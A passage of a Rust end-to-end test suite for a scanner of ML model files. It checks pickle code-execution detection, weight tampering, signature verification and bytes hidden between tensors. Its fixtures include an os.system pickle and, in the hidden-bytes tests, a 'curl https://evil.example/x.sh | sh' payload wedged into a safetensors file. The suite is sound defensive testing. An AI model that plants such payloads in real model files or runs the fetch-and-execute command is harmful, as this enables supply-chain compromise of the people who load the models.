//! End-to-end tests that drive the compiled `assay` binary, reproducing the
//! key walkthroughs from TEST.md and the exit-code contract from the README.

use std::path::{Path, PathBuf};
use std::process::Command;

fn bin() -> &'static str {
    env!("CARGO_BIN_EXE_assay")
}

fn tmpdir(tag: &str) -> PathBuf {
    let d = std::env::temp_dir().join(format!("assay-it-{}-{}", tag, std::process::id()));
    std::fs::create_dir_all(&d).unwrap();
    d
}

fn run(args: &[&str]) -> (i32, String) {
    let out = Command::new(bin()).args(args).output().expect("run assay");
    let code = out.status.code().unwrap_or(-1);
    let mut s = String::from_utf8_lossy(&out.stdout).into_owned();
    s.push_str(&String::from_utf8_lossy(&out.stderr));
    (code, s)
}

/// The TEST.md §4 self-test: a benign `os.system("echo …")` pickle must be
/// flagged PICKLE_RCE_RISK and exit non-zero under `--fail-on high`.
fn os_system_pickle() -> Vec<u8> {
    let mut p = vec![0x80, 0x02];
    p.extend_from_slice(b"cos\nsystem\n"); // GLOBAL os system
    p.push(b'U'); // SHORT_BINSTRING
    let arg = b"echo assay-detection-selftest";
    p.push(arg.len() as u8);
    p.extend_from_slice(arg);
    p.push(b'\x85'); // TUPLE1
    p.push(b'R'); // REDUCE
    p.push(b'.'); // STOP
    p
}

fn write(dir: &Path, name: &str, bytes: &[u8]) -> PathBuf {
    let p = dir.join(name);
    std::fs::write(&p, bytes).unwrap();
    p
}

fn safetensors(header: &str, data: &[u8]) -> Vec<u8> {
    let mut out = Vec::new();
    out.extend_from_slice(&(header.len() as u64).to_le_bytes());
    out.extend_from_slice(header.as_bytes());
    out.extend_from_slice(data);
    out
}

#[test]
fn selftest_pickle_flags_and_fails() {
    let dir = tmpdir("pickle");
    let p = write(&dir, "selftest.pkl", &os_system_pickle());
    let (code, out) = run(&["scan", p.to_str().unwrap(), "--fail-on", "high"]);
    assert_eq!(code, 1, "expected exit 1, got {code}\n{out}");
    assert!(out.contains("PICKLE_RCE_RISK"), "missing finding:\n{out}");
    assert!(out.contains("os.system"), "missing evidence:\n{out}");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn clean_safetensors_passes_and_manifest_is_rename_stable() {
    let dir = tmpdir("clean");
    let header = r#"{"weight":{"dtype":"U8","shape":[4],"data_offsets":[0,4]}}"#;
    let bytes = safetensors(header, &[1, 2, 3, 4]);

    let a = write(&dir, "model.safetensors", &bytes);
    let (code_a, out_a) = run(&["scan", a.to_str().unwrap(), "--json"]);
    assert_eq!(code_a, 0, "expected exit 0, got {code_a}\n{out_a}");

    let b = write(&dir, "renamed.safetensors", &bytes);
    let (_code_b, out_b) = run(&["scan", b.to_str().unwrap(), "--json"]);

    let man_a = extract_manifest(&out_a);
    let man_b = extract_manifest(&out_b);
    assert!(man_a.is_some(), "no manifest in:\n{out_a}");
    assert_eq!(man_a, man_b, "manifest changed across rename");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn malformed_safetensors_exits_two() {
    let dir = tmpdir("malformed");
    // Header length far larger than the file.
    let mut bytes = (9_999u64).to_le_bytes().to_vec();
    bytes.extend_from_slice(b"{}");
    let p = write(&dir, "bad.safetensors", &bytes);
    let (code, out) = run(&["scan", p.to_str().unwrap()]);
    assert_eq!(code, 2, "expected exit 2 (malformed), got {code}\n{out}");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn directory_scan_surfaces_safe_alternative() {
    let dir = tmpdir("repo");
    let header = r#"{"weight":{"dtype":"U8","shape":[4],"data_offsets":[0,4]}}"#;
    write(
        &dir,
        "model.safetensors",
        &safetensors(header, &[1, 2, 3, 4]),
    );
    write(&dir, "pytorch_model.bin", &os_system_pickle());

    let (code, out) = run(&["scan", dir.to_str().unwrap(), "--fail-on", "high"]);
    assert_eq!(code, 1, "expected exit 1\n{out}");
    assert!(
        out.contains("SAFE_ALTERNATIVE_AVAILABLE"),
        "missing hint:\n{out}"
    );
    let _ = std::fs::remove_dir_all(&dir);
}

fn extract_manifest(json: &str) -> Option<String> {
    let v: serde_json::Value = serde_json::from_str(json).ok()?;
    v.get("hashes")?
        .get("manifest")?
        .as_str()
        .map(|s| s.to_string())
}

// ===========================================================================
// Phase 2 acceptance criteria
// ===========================================================================

/// Build a safetensors file from (name, f32 values) tensors laid out in order.
fn safetensors_f32(tensors: &[(&str, Vec<f32>)]) -> Vec<u8> {
    let mut entries = Vec::new();
    let mut data = Vec::new();
    for (name, vals) in tensors {
        let begin = data.len();
        for v in vals {
            data.extend_from_slice(&v.to_le_bytes());
        }
        let end = data.len();
        entries.push(format!(
            "\"{name}\":{{\"dtype\":\"F32\",\"shape\":[{}],\"data_offsets\":[{begin},{end}]}}",
            vals.len()
        ));
    }
    let header = format!("{{{}}}", entries.join(","));
    safetensors(&header, &data)
}

/// Acceptance #2: an injected NaN triggers WEIGHT_NAN_INF at high (exit 1).
#[test]
fn deep_nan_triggers_weight_nan_inf() {
    let dir = tmpdir("nan");
    let buf = safetensors_f32(&[("model.layers.0.w", vec![1.0, f32::NAN, 2.0, 3.0])]);
    let p = write(&dir, "model.safetensors", &buf);
    let (code, out) = run(&["scan", p.to_str().unwrap(), "--deep", "--fail-on", "high"]);
    assert!(out.contains("WEIGHT_NAN_INF"), "missing finding:\n{out}");
    assert_eq!(code, 1, "expected exit 1 (high), got {code}\n{out}");
    let _ = std::fs::remove_dir_all(&dir);
}

/// Acceptance #3: scale exactly one layer ~100×; only that layer is flagged
/// WEIGHT_OUTLIER_LAYER (validates MAD robustness: the tamper must not raise
/// the threshold enough to hide itself).
#[test]
fn deep_tampered_layer_is_isolated() {
    let dir = tmpdir("tamper");
    let base: Vec<f32> = (0..64).map(|k| ((k % 7) as f32 - 3.0) * 0.01).collect();
    let tampered_idx = 3usize;
    let mut tensors: Vec<(String, Vec<f32>)> = Vec::new();
    for i in 0..6 {
        let vals: Vec<f32> = if i == tampered_idx {
            base.iter().map(|v| v * 100.0).collect()
        } else {
            base.clone()
        };
        tensors.push((format!("model.layers.{i}.mlp.weight"), vals));
    }
    let refs: Vec<(&str, Vec<f32>)> = tensors
        .iter()
        .map(|(n, v)| (n.as_str(), v.clone()))
        .collect();
    let buf = safetensors_f32(&refs);
    let p = write(&dir, "model.safetensors", &buf);

    let (_code, out) = run(&["scan", p.to_str().unwrap(), "--deep", "--json"]);
    let v: serde_json::Value = serde_json::from_str(&out).expect("json");
    let profile = v["layer_profile"].as_array().expect("layer_profile");
    assert_eq!(profile.len(), 6, "expected 6 layers:\n{out}");
    for point in profile {
        let layer = point["layer"].as_u64().unwrap();
        let anomalous = !point["anomaly"].is_null();
        if layer as usize == tampered_idx {
            assert!(anomalous, "tampered layer {layer} not flagged:\n{out}");
        } else {
            assert!(!anomalous, "layer {layer} wrongly flagged:\n{out}");
        }
    }
    let _ = std::fs::remove_dir_all(&dir);
}

/// Build a minimal GGUF with one F32 tensor (full stats) and one Q4_K tensor
/// (must be deferred, never garbage stats).
fn gguf_mixed() -> Vec<u8> {
    fn gstr(buf: &mut Vec<u8>, s: &str) {
        buf.extend_from_slice(&(s.len() as u64).to_le_bytes());
        buf.extend_from_slice(s.as_bytes());
    }
    let mut b = Vec::new();
    b.extend_from_slice(b"GGUF");
    b.extend_from_slice(&3u32.to_le_bytes()); // version
    b.extend_from_slice(&2u64.to_le_bytes()); // tensor_count
    b.extend_from_slice(&1u64.to_le_bytes()); // kv_count
                                              // KV: general.architecture = "llama"
    gstr(&mut b, "general.architecture");
    b.extend_from_slice(&8u32.to_le_bytes()); // STRING
    gstr(&mut b, "llama");
    // tensor 0: blk.0.attn_q.weight F32 [32] offset 0
    gstr(&mut b, "blk.0.attn_q.weight");
    b.extend_from_slice(&1u32.to_le_bytes()); // n_dims
    b.extend_from_slice(&32u64.to_le_bytes()); // dim
    b.extend_from_slice(&0u32.to_le_bytes()); // F32
    b.extend_from_slice(&0u64.to_le_bytes()); // offset
                                              // tensor 1: blk.0.ffn_down.weight Q4_K [256] offset 128
    gstr(&mut b, "blk.0.ffn_down.weight");
    b.extend_from_slice(&1u32.to_le_bytes());
    b.extend_from_slice(&256u64.to_le_bytes());
    b.extend_from_slice(&12u32.to_le_bytes()); // Q4_K
    b.extend_from_slice(&128u64.to_le_bytes()); // offset
                                                // pad to 32-byte alignment
    while b.len() % 32 != 0 {
        b.push(0);
    }
    // data: tensor0 = 32 f32, tensor1 = 144 bytes (1 Q4_K superblock)
    for k in 0..32 {
        b.extend_from_slice(&((k as f32) * 0.1).to_le_bytes());
    }
    b.extend_from_slice(&[0u8; 144]);
    b
}

/// Acceptance #4: quantized GGUF gets a clean STATS_DEFERRED_QUANTIZED, F32
/// tensor gets real stats; never garbage on raw quant bytes.
#[test]
fn deep_gguf_defers_kquant() {
    let dir = tmpdir("gguf");
    let p = write(&dir, "model.gguf", &gguf_mixed());
    let (_code, out) = run(&["scan", p.to_str().unwrap(), "--deep", "--json"]);
    let v: serde_json::Value = serde_json::from_str(&out).expect("json");
    let per = v["stats"]["per_tensor"].as_array().expect("per_tensor");
    let mut saw_full = false;
    let mut saw_deferred = false;
    for t in per {
        match t["quality"].as_str().unwrap() {
            "full" => {
                saw_full = true;
                assert!(t["mean"].is_number(), "full tensor missing mean:\n{out}");
            }
            "deferred_quantized" => {
                saw_deferred = true;
                assert!(t["mean"].is_null(), "deferred tensor has stats:\n{out}");
            }
            other => panic!("unexpected quality {other}"),
        }
    }
    assert!(saw_full && saw_deferred, "expected both qualities:\n{out}");
    assert!(
        out.contains("STATS_DEFERRED_QUANTIZED"),
        "missing finding:\n{out}"
    );
    let _ = std::fs::remove_dir_all(&dir);
}

// ===========================================================================
// compare command acceptance criteria
// ===========================================================================

fn layered_model(n_layers: usize, scale_layer: Option<(usize, f32)>) -> Vec<u8> {
    let base: Vec<f32> = (0..64).map(|k| ((k % 7) as f32 - 3.0) * 0.01).collect();
    let mut tensors: Vec<(String, Vec<f32>)> = Vec::new();
    for i in 0..n_layers {
        let vals: Vec<f32> = match scale_layer {
            Some((idx, s)) if idx == i => base.iter().map(|v| v * s).collect(),
            _ => base.clone(),
        };
        tensors.push((format!("model.layers.{i}.mlp.weight"), vals));
    }
    let refs: Vec<(&str, Vec<f32>)> = tensors
        .iter()
        .map(|(n, v)| (n.as_str(), v.clone()))
        .collect();
    safetensors_f32(&refs)
}

/// compare #1: a model vs itself → IDENTICAL, no drift outliers, exit 0.
#[test]
fn compare_identity_is_silent() {
    let dir = tmpdir("cmp-id");
    let buf = layered_model(8, None);
    let a = write(&dir, "a.safetensors", &buf);
    let b = write(&dir, "b.safetensors", &buf);
    let (code, out) = run(&[
        "compare",
        a.to_str().unwrap(),
        b.to_str().unwrap(),
        "--json",
    ]);
    let v: serde_json::Value = serde_json::from_str(&out).unwrap();
    assert!(out.contains("IDENTICAL"), "expected IDENTICAL:\n{out}");
    assert!(
        !out.contains("LAYER_DRIFT_OUTLIER"),
        "false positive:\n{out}"
    );
    assert_eq!(v["summary"]["identical_fraction"], 1.0);
    assert_eq!(code, 0, "identity should be clean, got {code}");
    let _ = std::fs::remove_dir_all(&dir);
}

/// compare #2: the money test. Scale one layer; only that layer is flagged.
#[test]
fn compare_isolates_tampered_layer() {
    let dir = tmpdir("cmp-tamper");
    let baseline = write(&dir, "baseline.safetensors", &layered_model(8, None));
    let subject = write(
        &dir,
        "subject.safetensors",
        &layered_model(8, Some((3, 4.0))),
    );
    let (code, out) = run(&[
        "compare",
        subject.to_str().unwrap(),
        baseline.to_str().unwrap(),
        "--json",
        "--fail-on",
        "high",
    ]);
    let v: serde_json::Value = serde_json::from_str(&out).unwrap();
    let mut flagged = Vec::new();
    for p in v["layer_drift"].as_array().unwrap() {
        if !p["anomaly"].is_null() {
            flagged.push(p["layer"].as_u64().unwrap());
        }
    }
    assert_eq!(
        flagged,
        vec![3],
        "only layer 3 should be flagged, got {flagged:?}\n{out}"
    );
    let sev = v["layer_drift"]
        .as_array()
        .unwrap()
        .iter()
        .find(|p| p["layer"] == 3)
        .unwrap()["anomaly"]["severity"]
        .as_str()
        .unwrap()
        .to_string();
    assert_eq!(sev, "high", "tamper should be high severity\n{out}");
    assert_eq!(code, 1, "tamper should fail --fail-on high");
    let _ = std::fs::remove_dir_all(&dir);
}

/// compare #3: different layer counts → ARCH_MISMATCH refusal; --force proceeds
/// with STRUCTURAL_DIVERGENCE for the missing layers.
#[test]
fn compare_arch_mismatch_refuses() {
    let dir = tmpdir("cmp-arch");
    let big = write(&dir, "big.safetensors", &layered_model(8, None));
    let small = write(&dir, "small.safetensors", &layered_model(4, None));

    let (_c, out) = run(&[
        "compare",
        big.to_str().unwrap(),
        small.to_str().unwrap(),
        "--json",
    ]);
    let v: serde_json::Value = serde_json::from_str(&out).unwrap();
    assert!(out.contains("ARCH_MISMATCH"), "expected refusal:\n{out}");
    assert_eq!(v["arch"]["match"], false);
    assert!(
        v["tensor_drift"].as_array().unwrap().is_empty(),
        "should not emit drift:\n{out}"
    );

    let (_c2, out2) = run(&[
        "compare",
        big.to_str().unwrap(),
        small.to_str().unwrap(),
        "--force",
        "--json",
    ]);
    assert!(
        out2.contains("STRUCTURAL_DIVERGENCE"),
        "force should surface structural:\n{out2}"
    );
    let _ = std::fs::remove_dir_all(&dir);
}

/// compare #4: deterministic output across runs.
#[test]
fn compare_is_deterministic() {
    let dir = tmpdir("cmp-det");
    let a = write(&dir, "a.safetensors", &layered_model(8, Some((2, 3.0))));
    let b = write(&dir, "b.safetensors", &layered_model(8, None));
    let (_c1, o1) = run(&[
        "compare",
        a.to_str().unwrap(),
        b.to_str().unwrap(),
        "--json",
    ]);
    let (_c2, o2) = run(&[
        "compare",
        a.to_str().unwrap(),
        b.to_str().unwrap(),
        "--json",
    ]);
    assert_eq!(o1, o2, "compare output not deterministic");
    let _ = std::fs::remove_dir_all(&dir);
}

/// Build a gpt2-like model. `wrapped` => keys carry a `transformer.` prefix and
/// an explicit (tied) `lm_head.weight`; otherwise flat keys with weight tying
/// (no lm_head). `drift` scales the per-layer MLP weights uniformly.
fn gpt2like(wrapped: bool, drift: f32) -> Vec<u8> {
    let wte: Vec<f32> = (0..16).map(|k| (k as f32 - 8.0) * 0.02).collect();
    let lnf: Vec<f32> = (0..8).map(|k| 1.0 + k as f32 * 0.01).collect();
    let base: Vec<f32> = (0..64).map(|k| ((k % 7) as f32 - 3.0) * 0.01).collect();
    let p = if wrapped { "transformer." } else { "" };
    let mut t: Vec<(String, Vec<f32>)> = Vec::new();
    t.push((format!("{p}wte.weight"), wte.clone()));
    for i in 0..12 {
        let vals: Vec<f32> = base.iter().map(|v| v * drift).collect();
        t.push((format!("{p}h.{i}.mlp.c_fc.weight"), vals));
    }
    t.push((format!("{p}ln_f.weight"), lnf));
    if wrapped {
        // DialoGPT-style: explicit lm_head tied (equal) to wte.
        t.push(("lm_head.weight".to_string(), wte));
    }
    let refs: Vec<(&str, Vec<f32>)> = t.iter().map(|(n, v)| (n.as_str(), v.clone())).collect();
    safetensors_f32(&refs)
}

fn count_finding(json: &serde_json::Value, id: &str) -> usize {
    json["findings"]
        .as_array()
        .map(|a| a.iter().filter(|f| f["id"] == id).count())
        .unwrap_or(0)
}

/// compare canonicalization: bare gpt2 vs `transformer.`-wrapped fine-tune must
/// align (not produce hundreds of false structural divergences).
#[test]
fn compare_canonicalizes_wrapper_prefix() {
    let dir = tmpdir("cmp-canon");
    let bare = write(&dir, "gpt2.safetensors", &gpt2like(false, 1.0));
    let wrapped = write(&dir, "dialogpt.safetensors", &gpt2like(true, 1.05));
    let (_c, out) = run(&[
        "compare",
        bare.to_str().unwrap(),
        wrapped.to_str().unwrap(),
        "--json",
    ]);
    let v: serde_json::Value = serde_json::from_str(&out).unwrap();
    assert_eq!(
        v["summary"]["matched"], 14,
        "should match wte+12 layers+ln_f:\n{out}"
    );
    assert_eq!(
        v["summary"]["structural"], 0,
        "no structural divergence expected:\n{out}"
    );
    assert_eq!(
        count_finding(&v, "TIED_WEIGHT"),
        1,
        "exactly one tied weight:\n{out}"
    );
    assert_eq!(count_finding(&v, "STRUCTURAL_DIVERGENCE"), 0);
    assert_eq!(
        count_finding(&v, "LAYER_DRIFT_OUTLIER"),
        0,
        "broad uniform drift must not flag:\n{out}"
    );
    let _ = std::fs::remove_dir_all(&dir);
}

/// Symmetry: swapping subject/baseline yields the same matched count and the
/// same single tied-weight note.
#[test]
fn compare_canonicalization_is_symmetric() {
    let dir = tmpdir("cmp-sym");
    let bare = write(&dir, "gpt2.safetensors", &gpt2like(false, 1.0));
    let wrapped = write(&dir, "dialogpt.safetensors", &gpt2like(true, 1.05));

    let (_a, o1) = run(&[
        "compare",
        bare.to_str().unwrap(),
        wrapped.to_str().unwrap(),
        "--json",
    ]);
    let (_b, o2) = run(&[
        "compare",
        wrapped.to_str().unwrap(),
        bare.to_str().unwrap(),
        "--json",
    ]);
    let v1: serde_json::Value = serde_json::from_str(&o1).unwrap();
    let v2: serde_json::Value = serde_json::from_str(&o2).unwrap();
    assert_eq!(
        v1["summary"]["matched"], v2["summary"]["matched"],
        "asymmetric matched count"
    );
    assert_eq!(count_finding(&v1, "TIED_WEIGHT"), 1);
    assert_eq!(count_finding(&v2, "TIED_WEIGHT"), 1);
    assert_eq!(v1["summary"]["structural"], 0);
    assert_eq!(v2["summary"]["structural"], 0);
    let _ = std::fs::remove_dir_all(&dir);
}

/// Acceptance #5/#6: Phase 1 output is unchanged without --deep, and Phase 2
/// output is deterministic across runs.
#[test]
fn phase1_unchanged_and_deterministic() {
    let dir = tmpdir("det");
    let buf = safetensors_f32(&[("model.layers.0.w", vec![1.0, 2.0, 3.0, 4.0])]);
    let p = write(&dir, "model.safetensors", &buf);

    let (_c, plain) = run(&["scan", p.to_str().unwrap(), "--json"]);
    assert!(
        !plain.contains("\"stats\""),
        "phase1 leaked stats:\n{plain}"
    );
    assert!(
        !plain.contains("layer_profile"),
        "phase1 leaked profile:\n{plain}"
    );

    let (_c1, deep1) = run(&["scan", p.to_str().unwrap(), "--deep", "--json"]);
    let (_c2, deep2) = run(&["scan", p.to_str().unwrap(), "--deep", "--json"]);
    assert!(deep1.contains("\"stats\""), "deep missing stats:\n{deep1}");
    assert_eq!(deep1, deep2, "phase 2 output not deterministic");

    // Phase 1 verdict byte-identical with and without --deep.
    let v_plain: serde_json::Value = serde_json::from_str(&plain).unwrap();
    let v_deep: serde_json::Value = serde_json::from_str(&deep1).unwrap();
    assert_eq!(v_plain["verdict"], v_deep["verdict"]);
    assert_eq!(v_plain["hashes"], v_deep["hashes"]);
    let _ = std::fs::remove_dir_all(&dir);
}

// ===========================================================================
// `verify`: signature and provenance, end to end
// ===========================================================================

/// A fixed key, so the whole suite stays deterministic and offline.
fn signing_key() -> ed25519_dalek::SigningKey {
    ed25519_dalek::SigningKey::from_bytes(&[7u8; 32])
}

/// Write a one-tensor model and return (path, its computed manifest hash).
fn signed_fixture(tag: &str) -> (PathBuf, PathBuf, String) {
    let dir = tmpdir(tag);
    let buf = safetensors_f32(&[("model.layers.0.w", vec![1.0, 2.0, 3.0, 4.0])]);
    let p = write(&dir, "model.safetensors", &buf);
    let (_c, json) = run(&["scan", p.to_str().unwrap(), "--json"]);
    let manifest = extract_manifest(&json).expect("manifest hash");
    (dir, p, manifest)
}

fn signature_status(json: &str) -> String {
    let v: serde_json::Value = serde_json::from_str(json).expect("json report");
    v["signature"].as_str().unwrap_or_default().to_string()
}

#[test]
fn verify_accepts_a_valid_detached_signature() {
    use ed25519_dalek::Signer;
    let (dir, p, manifest) = signed_fixture("verify-ok");
    let sk = signing_key();

    // The signature is over the manifest hash string, hex-encoded on disk.
    let sig = sk.sign(manifest.as_bytes());
    write(
        &dir,
        "model.safetensors.sig",
        hex::encode(sig.to_bytes()).as_bytes(),
    );
    let key = write(
        &dir,
        "signer.pub",
        hex::encode(sk.verifying_key().to_bytes()).as_bytes(),
    );

    let (code, out) = run(&[
        "verify",
        p.to_str().unwrap(),
        "--key",
        key.to_str().unwrap(),
        "--json",
    ]);
    assert_eq!(code, 0, "a valid signature must not fail the gate\n{out}");
    assert_eq!(signature_status(&out), "signed");
    assert!(out.contains("SIG_VERIFIED"), "{out}");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn verify_accepts_a_raw_64_byte_signature_too() {
    use ed25519_dalek::Signer;
    let (dir, p, manifest) = signed_fixture("verify-raw");
    let sk = signing_key();

    let sig = sk.sign(manifest.as_bytes());
    write(&dir, "model.safetensors.sig", &sig.to_bytes());
    let key = write(&dir, "signer.pub", &sk.verifying_key().to_bytes());

    let (code, out) = run(&[
        "verify",
        p.to_str().unwrap(),
        "--key",
        key.to_str().unwrap(),
        "--json",
    ]);
    assert_eq!(code, 0, "{out}");
    assert_eq!(signature_status(&out), "signed");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn verify_rejects_a_signature_over_different_content() {
    use ed25519_dalek::Signer;
    let (dir, p, _manifest) = signed_fixture("verify-bad");
    let sk = signing_key();

    // Signed something else: exactly what a swapped-weights attack looks like.
    let sig = sk.sign(b"blake3:not-this-model");
    write(
        &dir,
        "model.safetensors.sig",
        hex::encode(sig.to_bytes()).as_bytes(),
    );
    let key = write(
        &dir,
        "signer.pub",
        hex::encode(sk.verifying_key().to_bytes()).as_bytes(),
    );

    let (code, out) = run(&[
        "verify",
        p.to_str().unwrap(),
        "--key",
        key.to_str().unwrap(),
        "--json",
    ]);
    assert_eq!(code, 1, "a mismatch must fail the gate\n{out}");
    assert_eq!(signature_status(&out), "signature-mismatch");
    assert!(out.contains("SIG_MISMATCH"), "{out}");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn verify_without_a_key_says_unverified_rather_than_signed() {
    use ed25519_dalek::Signer;
    let (dir, p, manifest) = signed_fixture("verify-nokey");
    let sig = signing_key().sign(manifest.as_bytes());
    write(
        &dir,
        "model.safetensors.sig",
        hex::encode(sig.to_bytes()).as_bytes(),
    );

    let (code, out) = run(&["verify", p.to_str().unwrap(), "--json"]);
    assert_eq!(code, 0, "an unverifiable signature is not a failure\n{out}");
    assert_eq!(signature_status(&out), "unverified");
    assert!(out.contains("SIG_NO_KEY"), "{out}");
    assert!(
        !out.contains("SIG_VERIFIED"),
        "must not claim a pass:\n{out}"
    );
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn verify_matches_a_transparency_manifest() {
    let (dir, p, manifest) = signed_fixture("verify-tm");
    let bundle = write(
        &dir,
        "model.manifest.json",
        format!("{{\"manifest\":\"{manifest}\"}}").as_bytes(),
    );

    let (code, out) = run(&[
        "verify",
        p.to_str().unwrap(),
        "--bundle",
        bundle.to_str().unwrap(),
        "--json",
    ]);
    assert_eq!(code, 0, "{out}");
    assert_eq!(signature_status(&out), "signed");
    assert!(out.contains("SIG_MANIFEST_MATCH"), "{out}");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn verify_flags_a_transparency_manifest_that_records_other_weights() {
    let (dir, p, _manifest) = signed_fixture("verify-tm-bad");
    let bundle = write(
        &dir,
        "model.manifest.json",
        b"{\"manifest\":\"blake3:0000000000000000000000000000000000000000000000000000000000000000\"}",
    );

    let (code, out) = run(&[
        "verify",
        p.to_str().unwrap(),
        "--bundle",
        bundle.to_str().unwrap(),
        "--json",
    ]);
    assert_eq!(
        code, 1,
        "a recorded-hash mismatch must fail the gate\n{out}"
    );
    assert_eq!(signature_status(&out), "signature-mismatch");
    assert!(out.contains("SIG_MISMATCH"), "{out}");
    let _ = std::fs::remove_dir_all(&dir);
}

/// The honesty contract: a Sigstore bundle is present but its chain is not
/// verified, so it must never be reported as `signed`.
#[test]
fn verify_never_claims_sigstore_bundles_are_trusted() {
    let (dir, p, _manifest) = signed_fixture("verify-sigstore");
    write(
        &dir,
        "model.safetensors.sigstore",
        b"{\"mediaType\":\"application/vnd.dev.sigstore.bundle+json;version=0.3\",\
          \"verificationMaterial\":{},\"messageSignature\":{}}",
    );

    let (code, out) = run(&["verify", p.to_str().unwrap(), "--json"]);
    assert_eq!(code, 0, "{out}");
    assert_eq!(signature_status(&out), "unverified (sigstore)");
    assert!(out.contains("SIG_SIGSTORE_UNVERIFIED"), "{out}");
    assert!(!out.contains("SIG_VERIFIED"), "{out}");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn verify_reports_an_unrecognized_bundle_instead_of_ignoring_it() {
    let (dir, p, _manifest) = signed_fixture("verify-weird");
    let bundle = write(&dir, "weird.json", b"{\"something\":\"else\"}");

    let (code, out) = run(&[
        "verify",
        p.to_str().unwrap(),
        "--bundle",
        bundle.to_str().unwrap(),
        "--json",
    ]);
    assert_eq!(code, 0, "{out}");
    assert_eq!(signature_status(&out), "unverified");
    assert!(out.contains("SIG_UNRECOGNIZED"), "{out}");
    let _ = std::fs::remove_dir_all(&dir);
}

/// A sidecar next to the weights is honored by a plain `scan`, not just by
/// `verify`: provenance is never opt-in.
#[test]
fn scan_autodetects_a_model_sig_sidecar() {
    let (dir, p, manifest) = signed_fixture("verify-autodetect");
    write(
        &dir,
        "model.sig",
        format!("{{\"manifest\":\"{manifest}\"}}").as_bytes(),
    );

    let (code, out) = run(&["scan", p.to_str().unwrap(), "--json"]);
    assert_eq!(code, 0, "{out}");
    assert_eq!(signature_status(&out), "signed");
    assert!(out.contains("SIG_MANIFEST_MATCH"), "{out}");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn verify_on_an_unsigned_model_is_quiet_and_passes() {
    let (dir, p, _manifest) = signed_fixture("verify-unsigned");
    let (code, out) = run(&["verify", p.to_str().unwrap(), "--json"]);
    assert_eq!(code, 0, "{out}");
    assert_eq!(signature_status(&out), "unsigned");
    assert!(
        !out.contains("SIG_"),
        "no signature findings expected:\n{out}"
    );
    let _ = std::fs::remove_dir_all(&dir);
}

// ===========================================================================
// Byte accounting: bytes that belong to no tensor
// ===========================================================================

/// Two tensors with `payload` wedged in the hole between them. The header is
/// valid, every offset is in bounds, nothing overlaps: the only thing wrong
/// with this file is that it carries bytes no tensor claims.
fn safetensors_with_gap(payload: &[u8]) -> Vec<u8> {
    let gap = payload.len();
    let header = format!(
        "{{\"a\":{{\"dtype\":\"F32\",\"shape\":[1],\"data_offsets\":[0,4]}},\
          \"b\":{{\"dtype\":\"F32\",\"shape\":[1],\"data_offsets\":[{},{}]}}}}",
        4 + gap,
        8 + gap
    );
    let mut data = 1.0f32.to_le_bytes().to_vec();
    data.extend_from_slice(payload);
    data.extend_from_slice(&2.0f32.to_le_bytes());
    safetensors(&header, &data)
}

/// The B1 regression: a payload hidden between two tensors used to scan clean.
#[test]
fn a_payload_hidden_between_tensors_fails_the_gate() {
    let dir = tmpdir("gap");
    let p = write(
        &dir,
        "model.safetensors",
        &safetensors_with_gap(b"\x7fELFcurl https://evil.example/x.sh | sh"),
    );

    let (code, out) = run(&["scan", p.to_str().unwrap(), "--fail-on", "high"]);
    assert_eq!(code, 1, "hidden bytes must fail the gate\n{out}");
    assert!(out.contains("ST_UNREFERENCED_BYTES"), "{out}");
    assert!(out.contains("an ELF executable"), "{out}");
    assert!(out.contains("UNTRUSTED"), "{out}");
    let _ = std::fs::remove_dir_all(&dir);
}

/// Same file, machine-readable: the region must be locatable from the report.
#[test]
fn the_report_locates_hidden_bytes_precisely() {
    let dir = tmpdir("gap-json");
    let payload = b"\x7fELFhidden payload";
    let p = write(&dir, "model.safetensors", &safetensors_with_gap(payload));

    let (_code, out) = run(&["scan", p.to_str().unwrap(), "--json"]);
    let v: serde_json::Value = serde_json::from_str(&out).unwrap();
    let f = v["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|f| f["id"] == "ST_UNREFERENCED_BYTES")
        .expect("finding");
    assert_eq!(f["severity"], "high");

    let evidence = f["evidence"].as_array().unwrap()[0].as_str().unwrap();
    let range = evidence.split("file offsets ").nth(1).unwrap();
    let start: usize = range.split("..").next().unwrap().parse().unwrap();
    let end: usize = range.split("..").nth(1).unwrap().trim().parse().unwrap();
    let bytes = std::fs::read(&p).unwrap();
    assert_eq!(&bytes[start..end], payload, "reported range must be exact");
    let _ = std::fs::remove_dir_all(&dir);
}

/// The B2 sibling: anything appended after the last tensor is caught too.
#[test]
fn data_appended_after_the_last_tensor_fails_the_gate() {
    let dir = tmpdir("tail");
    let header = "{\"a\":{\"dtype\":\"F32\",\"shape\":[1],\"data_offsets\":[0,4]}}";
    let mut data = 1.0f32.to_le_bytes().to_vec();
    data.extend_from_slice(b"PK\x03\x04");
    data.extend_from_slice(&[0x41; 256]);
    let p = write(&dir, "model.safetensors", &safetensors(header, &data));

    let (code, out) = run(&["scan", p.to_str().unwrap(), "--fail-on", "high"]);
    assert_eq!(code, 1, "appended data must fail the gate\n{out}");
    assert!(out.contains("a ZIP archive"), "{out}");
    assert!(out.contains("after the last tensor"), "{out}");
    let _ = std::fs::remove_dir_all(&dir);
}

/// The invariant must not fire on well-formed files: real writers pack tensors
/// contiguously, so a normal model stays clean and silent.
#[test]
fn a_normally_packed_model_stays_clean() {
    let dir = tmpdir("packed");
    let buf = safetensors_f32(&[
        ("model.layers.0.w", vec![1.0, 2.0, 3.0, 4.0]),
        ("model.layers.1.w", vec![5.0, 6.0, 7.0, 8.0]),
    ]);
    let p = write(&dir, "model.safetensors", &buf);

    let (code, out) = run(&["scan", p.to_str().unwrap(), "--fail-on", "high"]);
    assert_eq!(code, 0, "{out}");
    assert!(
        !out.contains("ST_UNREFERENCED_BYTES"),
        "false positive:\n{out}"
    );
    let _ = std::fs::remove_dir_all(&dir);
}

/// Two files holding the same model, one with an archive stapled to the end.
/// The manifest hash is identical by design, so the report must expose a
/// second digest that is not.
#[test]
fn the_polyglot_and_its_clean_twin_are_distinguishable() {
    let dir = tmpdir("twin");
